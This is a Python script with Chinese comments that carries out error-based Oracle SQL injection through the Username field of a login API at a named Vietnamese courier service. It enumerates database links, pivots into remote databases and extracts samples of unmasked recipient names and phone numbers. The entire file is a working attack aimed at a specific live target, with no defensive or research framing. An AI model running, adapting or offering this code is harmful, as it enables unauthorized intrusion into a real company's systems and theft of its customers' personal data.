#!/usr/bin/env python3
"""
搜索远程数据库（通过DBLINK）中的解密数据
"""

import requests
import json
import time

class RemoteDBSearcher:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def discover_dblinks(self):
        """发现所有可用的数据库链接"""
        print("=" * 80)
        print("🔗 发现所有DBLINK")
        print("=" * 80)
        
        # 查询所有dblink
        query = f"SELECT DB_LINK FROM USER_DB_LINKS"
        result = self.extract_via_error(query)
        
        dblinks = []
        
        if result:
            print(f"\n找到DBLINK: {result}")
            dblinks.append(result)
        
        time.sleep(1)
        
        # 也尝试常见的dblink名称
        common_dblinks = [
            'XCENTER',
            'EMSTRACKING', 
            'EMSHN',
            'EMSHCM',
            'EMSGO',
            'EMSDN',
            'EMSCT',
            'EMSVT',
            'EMSHANOI',
            'EMSHCMDB',
            'PRODUCTION',
            'MAIN',
        ]
        
        print(f"\n测试常见DBLINK:")
        
        for dblink in common_dblinks:
            # 测试连接
            query_test = f"SELECT 1 FROM DUAL@{dblink}"
            result = self.extract_via_error(query_test)
            
            if result and result == '1':
                print(f"  ✅ {dblink} - 可访问")
                if dblink not in dblinks:
                    dblinks.append(dblink)
            else:
                print(f"  ❌ {dblink} - 不可访问")
            
            time.sleep(1)
        
        return dblinks
    
    def search_remote_decrypt_tables(self, dblinks):
        """在远程数据库搜索解密表"""
        print("\n" + "=" * 80)
        print("🔍 在远程数据库搜索解密表")
        print("=" * 80)
        
        date = '20251010'
        
        for dblink in dblinks:
            print(f"\n{'='*80}")
            print(f"数据库: {dblink}")
            print(f"{'='*80}")
            
            # 尝试查询E1E2_PH表
            tables_to_check = [
                ('E1E2_PH', 'DIENTHOAINHAN', 'NGAY'),
                ('E1E2_PH_DECRYPT_DATA', 'DIENTHOAINHAN', 'NGAY'),
                ('E1E2_PH_TEMP_DATA2_LOG', 'DIENTHOAINHAN', 'NGAY'),
                ('SHIPMENT', 'RECEIVER_PHONE', 'CREATE_DATE'),
            ]
            
            for table, phone_field, date_field in tables_to_check:
                print(f"\n  表: {table}@{dblink}")
                
                # 检查是否有10月10日数据
                query_count = f"SELECT COUNT(*) FROM EMS.{table}@{dblink} WHERE {date_field}='{date}'"
                count = self.extract_via_error(query_count)
                
                if count and count != '0':
                    print(f"    📊 10月10日记录数: {count}")
                    
                    time.sleep(1)
                    
                    # 检查未脱敏电话数
                    query_real = f"SELECT COUNT(*) FROM EMS.{table}@{dblink} WHERE {date_field}='{date}' AND {phone_field} NOT LIKE '%+%' AND {phone_field} NOT LIKE '%x%' AND LENGTH({phone_field})>=10"
                    real_count = self.extract_via_error(query_real)
                    
                    if real_count:
                        print(f"    📞 未脱敏电话: {real_count}")
                        
                        if real_count != '0':
                            print(f"    🎉 找到真实电话！")
                            
                            # 获取样本
                            time.sleep(1)
                            query_sample = f"SELECT MABC||'|'||{phone_field} FROM EMS.{table}@{dblink} WHERE {date_field}='{date}' AND {phone_field} NOT LIKE '%+%' AND LENGTH({phone_field})>=10 AND ROWNUM<=3"
                            sample = self.extract_via_error(query_sample)
                            
                            if sample:
                                print(f"    样本: {sample}")
                    
                    time.sleep(2)
                else:
                    print(f"    无10月10日数据或表不存在")
                
                time.sleep(1)
    
    def search_remote_all_tables(self, dblinks):
        """搜索远程数据库的所有表"""
        print("\n" + "=" * 80)
        print("📋 搜索远程数据库所有表")
        print("=" * 80)
        
        for dblink in dblinks:
            print(f"\n{'='*80}")
            print(f"数据库: {dblink}")
            print(f"{'='*80}")
            
            # 获取表列表
            query_tables = f"SELECT TABLE_NAME FROM ALL_TABLES@{dblink} WHERE OWNER='EMS' AND ROWNUM<=20"
            tables = self.extract_via_error(query_tables)
            
            if tables:
                print(f"  找到的表: {tables}")
            else:
                print(f"  无法获取表列表")
            
            time.sleep(2)
    
    def check_emstracking_detailed(self):
        """详细检查EMSTRACKING数据库（之前成功查询过）"""
        print("\n" + "=" * 80)
        print("🔬 详细检查 EMSTRACKING 数据库")
        print("=" * 80)
        
        dblink = 'EMSTRACKING'
        date = '20251010'
        
        print(f"\n测试连接...")
        query_test = f"SELECT 1 FROM DUAL@{dblink}"
        result = self.extract_via_error(query_test)
        
        if not result:
            print(f"❌ 无法连接到{dblink}")
            return
        
        print(f"✅ 连接成功")
        
        # 查询E1E2_PH表
        print(f"\n{'='*80}")
        print(f"表: E1E2_PH@{dblink}")
        print(f"{'='*80}")
        
        queries = [
            ("10月10日总记录", f"SELECT COUNT(*) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}'"),
            ("有电话记录", f"SELECT COUNT(*) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            ("未脱敏电话", f"SELECT COUNT(*) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND DIENTHOAINHAN NOT LIKE '%x%' AND LENGTH(DIENTHOAINHAN)>=10"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   {result}")
            time.sleep(2)
        
        # 获取样本
        print(f"\n样本数据:")
        query_sample = f"SELECT MABC||'|'||NGUOINHAN||'|'||DIENTHOAINHAN FROM (SELECT * FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL) WHERE ROWNUM<=3"
        samples = self.extract_via_error(query_sample)
        
        if samples:
            print(f"  {samples}")
        
        time.sleep(2)
        
        # 检查SHIPMENT表
        print(f"\n{'='*80}")
        print(f"表: SHIPMENT@{dblink}")
        print(f"{'='*80}")
        
        queries2 = [
            ("10月10日记录", f"SELECT COUNT(*) FROM EMS.SHIPMENT@{dblink} WHERE CREATE_DATE='{date}'"),
            ("未脱敏电话", f"SELECT COUNT(*) FROM EMS.SHIPMENT@{dblink} WHERE CREATE_DATE='{date}' AND RECEIVER_PHONE NOT LIKE '%+%' AND RECEIVER_PHONE NOT LIKE '%x%' AND LENGTH(RECEIVER_PHONE)>=10"),
        ]
        
        for name, query in queries2:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   {result}")
            time.sleep(2)
        
        # SHIPMENT样本
        print(f"\nSHIPMENT样本:")
        query_sample2 = f"SELECT CODE||'|'||RECEIVER_NAME||'|'||RECEIVER_PHONE FROM (SELECT * FROM EMS.SHIPMENT@{dblink} WHERE CREATE_DATE='{date}' AND RECEIVER_PHONE IS NOT NULL) WHERE ROWNUM<=3"
        samples2 = self.extract_via_error(query_sample2)
        
        if samples2:
            print(f"  {samples2}")
    
    def check_xcenter_database(self):
        """检查XCENTER数据库"""
        print("\n" + "=" * 80)
        print("🔬 详细检查 XCENTER 数据库")
        print("=" * 80)
        
        dblink = 'XCENTER'
        date = '20251010'
        
        print(f"\n测试连接...")
        query_test = f"SELECT 1 FROM DUAL@{dblink}"
        result = self.extract_via_error(query_test)
        
        if not result:
            print(f"❌ 无法连接到{dblink}")
            return
        
        print(f"✅ 连接成功")
        
        # 查询可用的表
        print(f"\n查询EMS schema的表...")
        query_tables = f"SELECT TABLE_NAME FROM ALL_TABLES@{dblink} WHERE OWNER='EMS' AND TABLE_NAME LIKE '%E1E2%' AND ROWNUM<=10"
        tables = self.extract_via_error(query_tables)
        
        if tables:
            print(f"  E1E2相关表: {tables}")
        
        time.sleep(2)
        
        # 尝试查询E1E2_PH
        print(f"\n尝试查询E1E2_PH...")
        query_count = f"SELECT COUNT(*) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}'"
        count = self.extract_via_error(query_count)
        
        if count:
            print(f"  10月10日记录: {count}")
            
            if count != '0':
                # 检查未脱敏
                time.sleep(1)
                query_real = f"SELECT COUNT(*) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND LENGTH(DIENTHOAINHAN)>=10"
                real = self.extract_via_error(query_real)
                
                if real:
                    print(f"  未脱敏电话: {real}")
                    
                    if real != '0':
                        print(f"  🎉 找到真实电话！")
                        
                        # 样本
                        time.sleep(1)
                        query_sample = f"SELECT MABC||'|'||DIENTHOAINHAN FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND LENGTH(DIENTHOAINHAN)>=10 AND ROWNUM<=3"
                        sample = self.extract_via_error(query_sample)
                        
                        if sample:
                            print(f"  样本: {sample}")
    
    def run_search(self):
        """执行完整搜索"""
        print("=" * 80)
        print("🌐 搜索远程数据库")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        # 发现dblink
        dblinks = self.discover_dblinks()
        
        if not dblinks:
            print("\n⚠️  未发现可用的DBLINK，尝试已知的...")
            dblinks = ['EMSTRACKING', 'XCENTER', 'EMSHN', 'EMSHCM']
        
        # 详细检查EMSTRACKING（之前成功过）
        self.check_emstracking_detailed()
        
        # 检查XCENTER
        self.check_xcenter_database()
        
        # 搜索其他远程数据库
        #self.search_remote_decrypt_tables(dblinks)
        
        print("\n" + "=" * 80)
        print("🎉 搜索完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    searcher = RemoteDBSearcher(target_url)
    searcher.run_search()
